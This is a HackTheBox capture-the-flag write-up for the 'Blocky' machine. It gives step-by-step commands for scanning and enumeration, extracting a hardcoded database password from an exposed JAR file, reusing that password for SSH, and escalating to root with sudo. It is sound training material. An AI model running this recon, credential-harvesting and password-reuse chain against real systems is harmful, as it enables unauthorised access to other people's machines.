# Blocky - HackTheBox Writeup

## Machine Info
- **Name:** Blocky
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy
- **IP:** X.X.X.X
- **Attacker IP:** Y.Y.Y.Y

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -sC -sv -oA blocky X.X.X.X
```

**Results:**
```
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp?
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http    Apache httpd 2.4.18
8192/tcp closed sophos
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Add Hosts Entry

```bash
echo "X.X.X.X blocky.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

### WPScan

```bash
wpscan --url http://blocky.htb --enumerate
```

**Key Findings:**

User identified: **notch**

### Directory Brute-forcing (Gobuster)

```bash
gobuster dir -u http://blocky.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Discovered Directories:**
- /``plugins/`` - Contains JAR files
- /``phpmyadmin/`` - MySQL admin panel
- /``wiki/`` - Wiki
- /``wp-admin/`` - WordPress admin
- /``wp-content/`` - WordPress content
- /``wp-includes/`` - WordPress includes
- /``javascript/`` - JavaScript files

---

## 3. Exploitation

### Discovering JAR Files

Navigate to the plugins directory:

```bash
curl http://blocky.htb/plugins/
```

**Found files:**
- `BlockyCore.jar`
- `gson-2.4.jar`

### Download JAR Files

```bash
wget http://blocky.htb/plugins/BlockyCore.jar
wget http://blocky.htb/plugins/gson-2.4.jar
```

### Extract JAR Files

```bash
jar -xf BlockyCore.jar
find . -name "*.class"
```

**Found:** `com/myfirstplugin/BlockyCore.class`

### Analyze BlockyCore.class

```bash
strings BlockyCore.class
```

**Key finding - MySQL credentials:**

```java
public String sqlHost = "localhost";
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

**Credentials found:**
- **Database user:** root
- **Database password:** 8YsqfCTnvxAUeduzjNSXe22

---

## 4. Gaining Access

### SSH Login

The MySQL root password is likely reused for SSH.

```bash
ssh notch@X.X.X.X
```

**Password:** `8YsqfCTnvxAUeduzjNSXe22`

**Success!** Logged in as `notch`

---

## 5. Privilege Escalation

### Check Sudo Privileges

```bash
sudo -l
```

**Output:**
```
User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

### Become Root

```bash
sudo su
```

**Success!** Now root!

---

## 6. Capture Flags

### User Flag

```bash
cat /home/notch/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Summary

Blocky is an easy machine that demonstrates:

1. **Information Disclosure**: WordPress plugin directory exposed JAR files
2. **Reverse Engineering**: Java class file contained hardcoded MySQL credentials
3. **Credential Reuse**: MySQL password reused for system user accounts
4. **Misconfiguration**: User `notch` had full sudo privileges

**Key takeaway:** Always check exposed files for hardcoded credentials and test password reuse across services!
